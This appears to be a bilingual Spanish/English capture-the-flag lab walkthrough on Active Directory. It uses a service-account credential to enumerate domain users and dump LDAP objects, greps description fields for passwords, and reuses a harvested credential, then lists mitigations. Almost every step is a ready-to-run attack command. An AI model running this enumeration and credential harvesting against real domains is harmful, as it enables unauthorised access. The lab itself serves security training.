Objetivo

Con la cuenta de servicio svc.readonly obtenida en AD 01, enumera los usuarios del dominio (la enumeración anónima no funciona contra este DC) y vuelca los objetos del directorio por LDAP. El servidor permite binds simples sin cifrado y un administrador dejó escrita una contraseña —y la flag— en el atributo description de un usuario.

Flag: LDAP · atributo description — captúrala en el Domain Controller y valídala en la barra lateral.

{% include 'labs/_ad_target.html' %}

Inicio rápido

# Enumerar usuarios del dominio con la credencial de AD 01
nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users

# Volcar descripciones de todos los usuarios por LDAP (bloodyAD, no nxc ldap)
bloodyAD --host {{ ad_dc_ip }} -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description

1 · Descubrir el contexto del directorio

El RootDSE se consulta sin autenticación y revela el naming context del dominio.

ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}

ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40

2 · Enumerar usuarios con la credencial de AD 01

La enumeración anónima de usuarios (RID cycling con sesión nula o guest) no funciona contra este Domain Controller. Con la credencial svc.readonly obtenida en AD 01, SAMR sí responde con normalidad — es una sesión autenticada, no anónima.

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users

Devuelve los 15 usuarios del dominio junto con su descripción — incluida la de t.rodriguez, que usarás en el paso 4.

3 · Bind autenticado con la cuenta de servicio

El servidor tiene ldap server require strong auth = no, así que acepta binds simples en texto claro.

export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
export DC={{ ad_dc_ip }}

ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName

Nota sobre este Domain Controller: nxc ldap, ldapdomaindump y windapsearch usan un bind NTLM (ldap3/impacket Sicily) que el servidor Samba corta a media negociación (LDAPSessionTerminatedByServerError / IndexError: list index out of range) — fallan incluso solo para autenticar, no es un problema de un módulo concreto. El bind LDAP simple (ldapsearch -x -D ..., usuario+contraseña en claro) sí funciona siempre; bloodyAD también funciona porque usa su propia librería (badldap), no ldap3.

4 · Volcar usuarios, grupos y equipos

# Usuarios (sin cuentas de máquina)
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf userAccountControl

# Grupos y sus miembros
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(objectClass=group)' sAMAccountName member

# Lo mismo con bloodyAD (alternativa que sí funciona contra este DC)
bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName

5 · Buscar credenciales en los atributos

El atributo description es legible por cualquier usuario autenticado y es donde más credenciales se filtran en dominios reales.

# Con bloodyAD
bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description

# A mano, filtrando por palabras clave
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(description=*)' sAMAccountName description \
  | grep -iE 'pass|pwd|HL\{'

El usuario t.rodriguez devuelve:

sAMAccountName: t.rodriguez
description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}

6 · Capturar la flag

HL{···}

Además te llevas una credencial válida más: t.rodriguez / Welcome2024!.

nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'

Mitigación

  • Prohibir credenciales en description, info o comment; auditarlos periódicamente.
  • Exigir LDAP firmado y sellado (ldap server require strong auth = yes, LDAPS obligatorio).
  • Limitar los atributos legibles por usuarios autenticados y monitorizar consultas LDAP masivas.

Herramientas

ldapsearch bloodyAD netexec (nxc) — solo SMB

1 · Discover the directory context

The RootDSE answers without authentication and reveals the domain naming context.

ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base namingcontexts
# namingContexts: DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}

ldapsearch -x -H ldap://{{ ad_dc_ip }} -s base '(objectClass=*)' | head -40

2 · Enumerate users with the AD 01 credential

Anonymous user enumeration (RID cycling with a null or guest session) does not work against this Domain Controller. With the svc.readonly credential from AD 01, SAMR responds normally — this is an authenticated session, not an anonymous one.

nxc smb {{ ad_dc_ip }} -u 'svc.readonly' -p 'ReadOnly123!' --users

Returns all 15 domain users along with their description — including t.rodriguez's, which you'll use in step 5.

3 · Authenticated bind with the service account

The server runs ldap server require strong auth = no, so it accepts cleartext simple binds.

export BASEDN='DC={{ ad_realm_lower.split('.')[0] }},DC={{ ad_realm_lower.split('.')[1] }}'
export DC={{ ad_dc_ip }}

ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(objectClass=user)' sAMAccountName | grep sAMAccountName

Note about this Domain Controller: nxc ldap, ldapdomaindump and windapsearch use an NTLM bind (ldap3/impacket Sicily) that the Samba server cuts off mid-negotiation (LDAPSessionTerminatedByServerError / IndexError: list index out of range) — they fail just to authenticate, it's not a single-module problem. A simple LDAP bind (ldapsearch -x -D ..., plaintext user+password) always works; bloodyAD also works because it uses its own library (badldap), not ldap3.

4 · Dump users, groups and computers

# Users (machine accounts excluded)
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(&(objectCategory=person)(objectClass=user))' \
  sAMAccountName description memberOf userAccountControl

# Groups and their members
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(objectClass=group)' sAMAccountName member

# Same thing with bloodyAD (alternative that does work against this DC)
bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(objectClass=group)' --attr sAMAccountName

5 · Hunt for credentials in the attributes

The description attribute is readable by any authenticated user and is where most credentials leak in real domains.

# With bloodyAD
bloodyAD --host $DC -d {{ ad_realm_lower }} -u 'svc.readonly' -p 'ReadOnly123!' get search --filter '(description=*)' --attr sAMAccountName,description

# By hand, filtering on keywords
ldapsearch -x -H ldap://$DC -D 'svc.readonly@{{ ad_realm_lower }}' -w 'ReadOnly123!' \
  -b "$BASEDN" '(description=*)' sAMAccountName description \
  | grep -iE 'pass|pwd|HL\{'

User t.rodriguez returns:

sAMAccountName: t.rodriguez
description: Cuenta temporal creada por Helpdesk. Password inicial: Welcome2024! - HL{···}

6 · Capture the flag

HL{···}

You also walk away with one more valid credential: t.rodriguez / Welcome2024!.

nxc smb $DC -u 't.rodriguez' -p 'Welcome2024!'

Mitigation

  • Ban credentials in description, info or comment; audit them regularly.
  • Require LDAP signing and sealing (ldap server require strong auth = yes, LDAPS only).
  • Restrict which attributes authenticated users can read and monitor bulk LDAP queries.
